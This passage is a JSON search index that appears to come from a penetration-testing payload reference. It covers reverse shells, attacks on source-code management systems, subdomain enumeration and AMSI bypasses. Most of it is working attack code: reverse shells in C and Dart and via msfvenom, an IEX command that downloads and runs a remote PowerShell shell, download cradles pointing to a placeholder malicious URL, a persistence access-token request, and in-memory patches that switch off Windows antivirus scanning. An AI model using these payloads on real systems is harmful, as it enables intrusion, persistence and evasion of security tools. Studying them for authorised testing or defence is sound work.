e){}};p.destroy();s.close();","title":"Groovy"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#groovy-alternative-1","text":"NOTE : This is more stealthy Thread.start { // Reverse shell here }","title":"Groovy Alternative 1"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#c","text":"Compile with gcc /tmp/shell.c --output csh && csh #include <stdio.h> #include <sys/socket.h> #include <sys/types.h> #include <stdlib.h> #include <unistd.h> #include <netinet/in.h> #include <arpa/inet.h> int main(void){ int port = 4242; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.sin_family = AF_INET; revsockaddr.sin_port = htons(port); revsockaddr.sin_addr.s_addr = inet_addr(\"10.0.0.1\"); connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)); dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2); char * const argv[] = {\"/bin/sh\", NULL}; execve(\"/bin/sh\", argv, NULL); return 0; }","title":"C"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#dart","text":"import 'dart:io'; import 'dart:convert'; main() { Socket.connect(\"10.0.0.1\", 4242).then((socket) { socket.listen((data) { Process.start('powershell.exe', []).then((Process process) { process.stdin.writeln(new String.fromCharCodes(data).trim()); process.stdout .transform(utf8.decoder) .listen((output) { socket.write(output); }); }); }, onDone: () { socket.destroy(); }); }); }","title":"Dart"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#meterpreter-shell","text":"","title":"Meterpreter Shell"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#windows-staged-reverse-tcp","text":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe","title":"Windows Staged reverse TCP"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#windows-stageless-reverse-tcp","text":"msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe","title":"Windows Stageless reverse TCP"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#linux-staged-reverse-tcp","text":"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf","title":"Linux Staged reverse TCP"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#linux-stageless-reverse-tcp","text":"msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf","title":"Linux Stageless reverse TCP"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#other-platforms","text":"$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f elf > shell.elf $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f exe > shell.exe $ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f macho > shell.macho $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f asp > shell.asp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.jsp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f war > shell.war $ msfvenom -p cmd/unix/reverse_python LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.py $ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.sh $ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.pl $ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php","title":"Other platforms"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#spawn-tty-shell","text":"In order to catch a shell, you need to listen on the desired port. rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L] . rlwrap nc 10.0.0.1 4242 rlwrap -r -f . nc 10.0.0.1 4242 -f . will make rlwrap use the current history file as a completion word list. -r Put all words seen on in- and output on the completion list. Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell. :warning: OhMyZSH might break this trick, a simple sh is recommended The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect ctrl+z echo $TERM && tput lines && tput cols # for bash stty raw -echo fg # for zsh stty raw -echo; fg reset export SHELL=bash export TERM=xterm-256color stty rows <num> columns <cols> or use socat binary to get a fully tty reverse shell socat file:`tty`,raw,echo=0 tcp-listen:12345 Spawn a TTY shell from an interpreter /bin/sh -i python3 -c 'import pty; pty.spawn(\"/bin/sh\")' python3 -c \"__import__('pty').spawn('/bin/bash')\" python3 -c \"__import__('subprocess').call(['/bin/bash'])\" perl -e 'exec \"/bin/sh\";' perl: exec \"/bin/sh\"; perl -e 'print `/bin/bash`' ruby: exec \"/bin/sh\" lua: os.execute('/bin/sh') vi: :!bash vi: :set shell=/bin/bash:shell nmap: !sh mysql: ! bash Alternative TTY method www-data@debian:/dev/shm$ su - user su: must be run from a terminal www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null www-data@debian:/dev/shm$ su - user Password: P4ssW0rD user@debian:~$","title":"Spawn TTY Shell"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#fully-interactive-reverse-shell-on-windows","text":"The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals. ConPtyShell uses the function CreatePseudoConsole() . This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763). Server Side: stty raw -echo; (stty size; cat) | nc -lvnp 3001 Client Side: IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001 Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1","title":"Fully interactive reverse shell on Windows"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#references","text":"Reverse Bash Shell One Liner Pentest Monkey - Cheat Sheet Reverse shell Spawning a TTY Shell Obtaining a fully interactive shell","title":"References"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/","text":"Source Code Management Summary Enumeration Exploit Gitlab CI/Github Actions References Enumeration Using SCMKit - Source Code Management Attack Toolkit Discover repositories being used in a particular SCM system ps1 SCMKit.exe -s gitlab -m listrepo -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listrepo -c apiKey -u https://gitlab.something.local Search for repositories by repository name in a particular SCM system ps1 SCMKit.exe -s github -m searchrepo -c userName:password -u https://github.something.local -o \"some search term\" SCMKit.exe -s gitlab -m searchrepo -c apikey -u https://gitlab.something.local -o \"some search term\" Search for code containing a given keyword in a particular SCM system ps1 SCMKit.exe -s github -m searchcode -c userName:password -u https://github.something.local -o \"some search term\" SCMKit.exe -s github -m searchcode -c apikey -u https://github.something.local -o \"some search term\" Search for files in repositories containing a given keyword in the file name in a particular SCM system ps1 SCMKit.exe -s gitlab -m searchfile -c userName:password -u https://gitlab.something.local -o \"some search term\" SCMKit.exe -s gitlab -m searchfile -c apikey -u https://gitlab.something.local -o \"some search term\" List snippets owned by the current user in GitLab ps1 SCMKit.exe -s gitlab -m listsnippet -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listsnippet -c apikey -u https://gitlab.something.local List all GitLab runners available to the current user in GitLab ps1 SCMKit.exe -s gitlab -m listrunner -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listrunner -c apikey -u https://gitlab.something.local Get the assigned privileges to an access token being used in a particular SCM system ps1 SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local Promote a normal user to an administrative role in a particular SCM system ps1 SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName Create/List/Delete an access token to be used in a particular SCM system ps1 SCMKit.exe -s gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m createpat -c apikey -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m removepat -c userName:password -u https://gitlab.something.local -o patID SCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local -o targetUser SCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser Create/List an SSH key to be used in a particular SCM system ps1 SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local -o \"ssh public key\" SCMKit.exe -s gitlab -m createsshkey -c apiToken -u https://gitlab.something.local -o \"ssh public key\" SCMKit.exe -s gitlab -m listsshkey -c userName:password -u https://github.something.local SCMKit.exe -s gitlab -m listsshkey -c apiToken -u https://github.something.local SCMKit.exe -s gitlab -m removesshkey -c userName:password -u https://gitlab.something.local -o sshKeyID SCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local -o sshKeyID Personal Access Token Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab instance. curl -k --request POST --header \"PRIVATE-TOKEN: apiToken\" --data \"name=user-persistence-token\" --data \"expires_at=\" --data \"scopes[]=api\" --data \"scopes[]=read_repository\" --data \"scopes[]=write_repository\" \"https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens\" Exploit Gitlab CI/Github Actions Gitlab-CI \"Command Execution\" example: .gitlab-ci.yml ```yaml stages: - test test: stage: test script: - | whoami parallel: matrix: - RUNNER: VM1 - RUNNER: VM2 - RUNNER: VM3 tags: - ${RUNNER} * Github Action \"Command Execution\" example: `.github/workflows/example.yml` yml name: example on: workflow_dispatch: push: branches: [ main ] pull_request: branches: [ main ] jobs: build: runs-on: windows-2019 steps: - name: Execute run: | whoami ``` References Controlling the Source: Abusing Source Code Management Systems - Brett Hawkins - August 9, 2022","title":"Source Code Management"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#source-code-management","text":"","title":"Source Code Management"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#summary","text":"Enumeration Exploit Gitlab CI/Github Actions References","title":"Summary"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#enumeration","text":"Using SCMKit - Source Code Management Attack Toolkit Discover repositories being used in a particular SCM system ps1 SCMKit.exe -s gitlab -m listrepo -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listrepo -c apiKey -u https://gitlab.something.local Search for repositories by repository name in a particular SCM system ps1 SCMKit.exe -s github -m searchrepo -c userName:password -u https://github.something.local -o \"some search term\" SCMKit.exe -s gitlab -m searchrepo -c apikey -u https://gitlab.something.local -o \"some search term\" Search for code containing a given keyword in a particular SCM system ps1 SCMKit.exe -s github -m searchcode -c userName:password -u https://github.something.local -o \"some search term\" SCMKit.exe -s github -m searchcode -c apikey -u https://github.something.local -o \"some search term\" Search for files in repositories containing a given keyword in the file name in a particular SCM system ps1 SCMKit.exe -s gitlab -m searchfile -c userName:password -u https://gitlab.something.local -o \"some search term\" SCMKit.exe -s gitlab -m searchfile -c apikey -u https://gitlab.something.local -o \"some search term\" List snippets owned by the current user in GitLab ps1 SCMKit.exe -s gitlab -m listsnippet -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listsnippet -c apikey -u https://gitlab.something.local List all GitLab runners available to the current user in GitLab ps1 SCMKit.exe -s gitlab -m listrunner -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listrunner -c apikey -u https://gitlab.something.local Get the assigned privileges to an access token being used in a particular SCM system ps1 SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local Promote a normal user to an administrative role in a particular SCM system ps1 SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName Create/List/Delete an access token to be used in a particular SCM system ps1 SCMKit.exe -s gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m createpat -c apikey -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m removepat -c userName:password -u https://gitlab.something.local -o patID SCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local -o targetUser SCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser Create/List an SSH key to be used in a particular SCM system ps1 SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local -o \"ssh public key\" SCMKit.exe -s gitlab -m createsshkey -c apiToken -u https://gitlab.something.local -o \"ssh public key\" SCMKit.exe -s gitlab -m listsshkey -c userName:password -u https://github.something.local SCMKit.exe -s gitlab -m listsshkey -c apiToken -u https://github.something.local SCMKit.exe -s gitlab -m removesshkey -c userName:password -u https://gitlab.something.local -o sshKeyID SCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local -o sshKeyID","title":"Enumeration"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#personal-access-token","text":"Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab instance. curl -k --request POST --header \"PRIVATE-TOKEN: apiToken\" --data \"name=user-persistence-token\" --data \"expires_at=\" --data \"scopes[]=api\" --data \"scopes[]=read_repository\" --data \"scopes[]=write_repository\" \"https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens\"","title":"Personal Access Token"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#exploit-gitlab-cigithub-actions","text":"Gitlab-CI \"Command Execution\" example: .gitlab-ci.yml ```yaml stages: - test test: stage: test script: - | whoami parallel: matrix: - RUNNER: VM1 - RUNNER: VM2 - RUNNER: VM3 tags: - ${RUNNER} * Github Action \"Command Execution\" example: `.github/workflows/example.yml` yml name: example on: workflow_dispatch: push: branches: [ main ] pull_request: branches: [ main ] jobs: build: runs-on: windows-2019 steps: - name: Execute run: | whoami ```","title":"Exploit Gitlab CI/Github Actions"},{"location":"Methodology%20and%20Resources/Source%20Code%20Management/#references","text":"Controlling the Source: Abusing Source Code Management Systems - Brett Hawkins - August 9, 2022","title":"References"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/","text":"Subdomains Enumeration Summary Enumerate all subdomains Subbrute KnockPy GoogleDorks EyeWitness Sublist3r Subfinder Findomain Aquatone (Ruby and Go versions) AltDNS MassDNS Nmap Subdomain take over tko-subs HostileSubBruteForcer SubOver Enumerate all subdomains (only if the scope is *.domain.ext) Using Subbrute git clone https://github.com/TheRook/subbrute python subbrute.py domain.example.com Using KnockPy with Daniel Miessler\u2019s SecLists for subdomain \"/Discover/DNS\" git clone https://github.com/guelfoweb/knock git clone https://github.com/danielmiessler/SecLists.git knockpy domain.com -w subdomains-top1mil-110000.txt Using EyeWitness and Nmap scans from the KnockPy and enumall scans git clone https://github.com/ChrisTruncer/EyeWitness.git ./setup/setup.sh ./EyeWitness.py -f filename -t optionaltimeout --open (Optional) ./EyeWitness -f urls.txt --web ./EyeWitness -x urls.xml -t 8 --headless ./EyeWitness -f rdp.txt --rdp Using Google Dorks and Google Transparency Report You need to include subdomains ;) https://www.google.com/transparencyreport/https/ct/?hl=en-US#domain=[DOMAIN]g&incl_exp=true&incl_sub=true site:*.domain.com -www site:domain.com filetype:pdf site:domain.com inurl:'&' site:domain.com inurl:login,register,upload,logout,redirect,redir,goto,admin site:domain.com ext:php,asp,aspx,jsp,jspa,txt,swf site:*.*.domain.com Using Sublist3r To enumerate subdomains of specific domain and show the results in realtime: python sublist3r.py -v -d example.com To enumerate subdomains and enable the bruteforce module: python sublist3r.py -b -d example.com To enumerate subdomains and use specific engines such Google, Yahoo and Virustotal engines python sublist3r.py -e google,yahoo,virustotal -d example.com python sublist3r.py -b -d example.com Using Subfinder go get github.com/subfinder/subfinder ./Subfinder/subfinder --set-config PassivetotalUsername='USERNAME',PassivetotalKey='KEY' ./Subfinder/subfinder --set-config RiddlerEmail=\"EMAIL\",RiddlerPassword=\"PASSWORD\" ./Subfinder/subfinder --set-config CensysUsername=\"USERNAME\",CensysSecret=\"SECRET\" ./Subfinder/subfinder --set-config SecurityTrailsKey='KEY' ./Subfinder/subfinder -d example.com -o /tmp/results_subfinder.txt Using Findomain $ wget https://github.com/Edu4rdSHL/findomain/releases/latest/download/findomain-linux $ chmod +x findomain-linux $ findomain_spyse_token=\"YourAccessToken\" $ findomain_virustotal_token=\"YourAccessToken\" $ findomain_fb_token=\"YourAccessToken\" $ ./findomain-linux -t example.com -o Using Aquatone - old version (Ruby) gem install aquatone Discover subdomains : results in ~/aquatone/example.com/hosts.txt aquatone-discover --domain example.com aquatone-discover --domain example.com --threads 25 aquatone-discover --domain example.com --sleep 5 --jitter 30 aquatone-discover --set-key shodan o1hyw8pv59vSVjrZU3Qaz6ZQqgM91ihQ Active scans : results in ~/aquatone/example.com/urls.txt aquatone-scan --domain example.com aquatone-scan --domain example.com --ports 80,443,3000,8080 aquatone-scan --domain example.com --ports large aquatone-scan --domain example.com --threads 25 Final results aquatone-gather --domain example.com Alternatively, you can use the Docker image provided by txt3rob. https://hub.docker.com/r/txt3rob/aquatone-docker/ docker pull txt3rob/aquatone-docker docker run -it txt3rob/aquatone-docker aq example.com Using Aquatone - new version (Go) # Subfinder version ./Subfinder/subfinder -d $1 -r 8.8.8.8,1.1.1.1 -nW -o /tmp/subresult$1 cat /tmp/subresult$1 | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1 # Amass version ./Amass/amass -active -brute -o /tmp/hosts.txt -d $1 cat /tmp/hosts.txt | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1 Using AltDNS It's recommended to use massdns in order to resolve the result of AltDNS WORDLIST_PERMUTATION=\"./Altdns/words.txt\" python2.7 ./Altdns/altdns.py -i /tmp/inputdomains.txt -o /tmp/out.txt -w $WORDLIST_PERMUTATION Alternatively you can use goaltdns Using MassDNS DNS_RESOLVERS=\"./resolvers.txt\" cat /tmp/results_subfinder.txt | massdns -r $DNS_RESOLVERS -t A -o S -w /tmp/results_subfinder_resolved.txt Using Nmap nmap -sn --script hostmap-crtsh host_to_scan.tld Subdomain take over Check Can I take over xyz by EdOverflow for a list of services and how to claim (sub)domains with dangling DNS records. Using tko-subs go get github.com/anshumanbh/tko-subs ./bin/tko-subs -domains=./lists/domains_tkos.txt -data=./lists/providers-data.csv Using HostileSubBruteForcer git clone https://github.com/nahamsec/HostileSubBruteforcer chmod +x sub_brute.rb ./sub_brute.rb Using SubOver go get github.com/Ice3man543/SubOver ./SubOver -l subdomains.txt References Subdomain Takeover: Proof Creation for Bug Bounties - Patrik Hudak Subdomain Takeover: Basics - Patrik Hudak","title":"Subdomains Enumeration"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#subdomains-enumeration","text":"","title":"Subdomains Enumeration"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#summary","text":"Enumerate all subdomains Subbrute KnockPy GoogleDorks EyeWitness Sublist3r Subfinder Findomain Aquatone (Ruby and Go versions) AltDNS MassDNS Nmap Subdomain take over tko-subs HostileSubBruteForcer SubOver","title":"Summary"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#enumerate-all-subdomains-only-if-the-scope-is-domainext","text":"","title":"Enumerate all subdomains (only if the scope is *.domain.ext)"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-subbrute","text":"git clone https://github.com/TheRook/subbrute python subbrute.py domain.example.com","title":"Using Subbrute"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-knockpy-with-daniel-miesslers-seclists-for-subdomain-discoverdns","text":"git clone https://github.com/guelfoweb/knock git clone https://github.com/danielmiessler/SecLists.git knockpy domain.com -w subdomains-top1mil-110000.txt Using EyeWitness and Nmap scans from the KnockPy and enumall scans git clone https://github.com/ChrisTruncer/EyeWitness.git ./setup/setup.sh ./EyeWitness.py -f filename -t optionaltimeout --open (Optional) ./EyeWitness -f urls.txt --web ./EyeWitness -x urls.xml -t 8 --headless ./EyeWitness -f rdp.txt --rdp","title":"Using KnockPy with Daniel Miessler\u2019s SecLists for subdomain \"/Discover/DNS\""},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-google-dorks-and-google-transparency-report","text":"You need to include subdomains ;) https://www.google.com/transparencyreport/https/ct/?hl=en-US#domain=[DOMAIN]g&incl_exp=true&incl_sub=true site:*.domain.com -www site:domain.com filetype:pdf site:domain.com inurl:'&' site:domain.com inurl:login,register,upload,logout,redirect,redir,goto,admin site:domain.com ext:php,asp,aspx,jsp,jspa,txt,swf site:*.*.domain.com","title":"Using Google Dorks and Google Transparency Report"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-sublist3r","text":"To enumerate subdomains of specific domain and show the results in realtime: python sublist3r.py -v -d example.com To enumerate subdomains and enable the bruteforce module: python sublist3r.py -b -d example.com To enumerate subdomains and use specific engines such Google, Yahoo and Virustotal engines python sublist3r.py -e google,yahoo,virustotal -d example.com python sublist3r.py -b -d example.com","title":"Using Sublist3r"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-subfinder","text":"go get github.com/subfinder/subfinder ./Subfinder/subfinder --set-config PassivetotalUsername='USERNAME',PassivetotalKey='KEY' ./Subfinder/subfinder --set-config RiddlerEmail=\"EMAIL\",RiddlerPassword=\"PASSWORD\" ./Subfinder/subfinder --set-config CensysUsername=\"USERNAME\",CensysSecret=\"SECRET\" ./Subfinder/subfinder --set-config SecurityTrailsKey='KEY' ./Subfinder/subfinder -d example.com -o /tmp/results_subfinder.txt","title":"Using Subfinder"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-findomain","text":"$ wget https://github.com/Edu4rdSHL/findomain/releases/latest/download/findomain-linux $ chmod +x findomain-linux $ findomain_spyse_token=\"YourAccessToken\" $ findomain_virustotal_token=\"YourAccessToken\" $ findomain_fb_token=\"YourAccessToken\" $ ./findomain-linux -t example.com -o","title":"Using Findomain"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-aquatone-old-version-ruby","text":"gem install aquatone Discover subdomains : results in ~/aquatone/example.com/hosts.txt aquatone-discover --domain example.com aquatone-discover --domain example.com --threads 25 aquatone-discover --domain example.com --sleep 5 --jitter 30 aquatone-discover --set-key shodan o1hyw8pv59vSVjrZU3Qaz6ZQqgM91ihQ Active scans : results in ~/aquatone/example.com/urls.txt aquatone-scan --domain example.com aquatone-scan --domain example.com --ports 80,443,3000,8080 aquatone-scan --domain example.com --ports large aquatone-scan --domain example.com --threads 25 Final results aquatone-gather --domain example.com Alternatively, you can use the Docker image provided by txt3rob. https://hub.docker.com/r/txt3rob/aquatone-docker/ docker pull txt3rob/aquatone-docker docker run -it txt3rob/aquatone-docker aq example.com","title":"Using Aquatone - old version (Ruby)"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-aquatone-new-version-go","text":"# Subfinder version ./Subfinder/subfinder -d $1 -r 8.8.8.8,1.1.1.1 -nW -o /tmp/subresult$1 cat /tmp/subresult$1 | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1 # Amass version ./Amass/amass -active -brute -o /tmp/hosts.txt -d $1 cat /tmp/hosts.txt | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1","title":"Using Aquatone - new version (Go)"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-altdns","text":"It's recommended to use massdns in order to resolve the result of AltDNS WORDLIST_PERMUTATION=\"./Altdns/words.txt\" python2.7 ./Altdns/altdns.py -i /tmp/inputdomains.txt -o /tmp/out.txt -w $WORDLIST_PERMUTATION Alternatively you can use goaltdns","title":"Using AltDNS"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-massdns","text":"DNS_RESOLVERS=\"./resolvers.txt\" cat /tmp/results_subfinder.txt | massdns -r $DNS_RESOLVERS -t A -o S -w /tmp/results_subfinder_resolved.txt","title":"Using MassDNS"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-nmap","text":"nmap -sn --script hostmap-crtsh host_to_scan.tld","title":"Using Nmap"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#subdomain-take-over","text":"Check Can I take over xyz by EdOverflow for a list of services and how to claim (sub)domains with dangling DNS records.","title":"Subdomain take over"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-tko-subs","text":"go get github.com/anshumanbh/tko-subs ./bin/tko-subs -domains=./lists/domains_tkos.txt -data=./lists/providers-data.csv","title":"Using tko-subs"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-hostilesubbruteforcer","text":"git clone https://github.com/nahamsec/HostileSubBruteforcer chmod +x sub_brute.rb ./sub_brute.rb","title":"Using HostileSubBruteForcer"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-subover","text":"go get github.com/Ice3man543/SubOver ./SubOver -l subdomains.txt","title":"Using SubOver"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#references","text":"Subdomain Takeover: Proof Creation for Bug Bounties - Patrik Hudak Subdomain Takeover: Basics - Patrik Hudak","title":"References"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/","text":"AMSI Bypass Summary Which Endpoint Protection is Using AMSI Patching amsi.dll AmsiScanBuffer by rasta-mouse Dont use net webclient Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass Forcing an error Disable Script Logging Amsi Buffer Patch - In memory Same as 6 but integer Bytes instead of Base64 Using Matt Graeber's Reflection method Using Matt Graeber's Reflection method with WMF5 autologging bypass Using Matt Graeber's second Reflection method Using Cornelis de Plaa's DLL hijack method Use Powershell Version 2 - No AMSI Support there Nishang all in one Adam Chesters Patch AMSI.fail Which Endpoint Protection is Using AMSI https://github.com/subat0mik/whoamsi/wiki/Which-Endpoint-Protection-is-Using-AMSI%3F Patching amsi.dll AmsiScanBuffer by rasta-mouse $Win32 = @\" using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\") $Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\") $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6) Dont use net webclient Not Working anymore, there was a patch for it $webreq = [System.Net.WebRequest]::Create(\u2018https://maliciousscripturl/malicious.ps1\u2019) $resp=$webreq.GetResponse() $respstream=$resp.GetResponseStream() $reader=[System.IO.StreamReader]::new($respstream) $content=$reader.ReadToEnd() IEX($content) The Short version of dont use powershell net webclient Not Working anymore, there was a patch for it IEX([Net.Webclient]::new().DownloadString(\"https://maliciousscripturl/malicious.ps1\")) Amsi ScanBuffer Patch Egghunter with blog post: https://www.contextis.com/us/blog/amsi-bypass Write-Host \"-- AMSI Patch\" Write-Host \"-- Paul La\u00een\u00e9 (@am0nsec)\" Write-Host \"\" $Kernel32 = @\" using System; using System.Runtime.InteropServices; public class Kernel32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string lpLibFileName); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type $Kernel32 Class Hunter { static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) { while ($true) { [int]$count = 0 while ($true) { [IntPtr]$address = [IntPtr]::Add($address, 1) If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) { $count++ If ($count -eq $egg.Length) { return [IntPtr]::Subtract($address, $egg.Length - 1) } } Else { break } } } return $address } } [IntPtr]$hModule = [Kernel32]::LoadLibrary(\"amsi.dll\") Write-Host \"[+] AMSI DLL Handle: $hModule\" [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, \"DllCanUnloadNow\") Write-Host \"[+] DllCanUnloadNow address: $dllCanUnloadNowAddress\" If ([IntPtr]::Size -eq 8) { Write-Host \"[+] 64-bits process\" [byte[]]$egg = [byte[]] ( 0x4C, 0x8B, 0xDC, # mov r11,rsp 0x49, 0x89, 0x5B, 0x08, # mov qword ptr [r11+8],rbx 0x49, 0x89, 0x6B, 0x10, # mov qword ptr [r11+10h],rbp 0x49, 0x89, 0x73, 0x18, # mov qword ptr [r11+18h],rsi 0x57, # push rdi 0x41, 0x56, # push r14 0x41, 0x57, # push r15 0x48, 0x83, 0xEC, 0x70 # sub rsp,70h ) } Else { Write-Host \"[+] 32-bits process\" [byte[]]$egg = [byte[]] ( 0x8B, 0xFF, # mov edi,edi 0x55, # push ebp 0x8B, 0xEC, # mov ebp,esp 0x83, 0xEC, 0x18, # sub 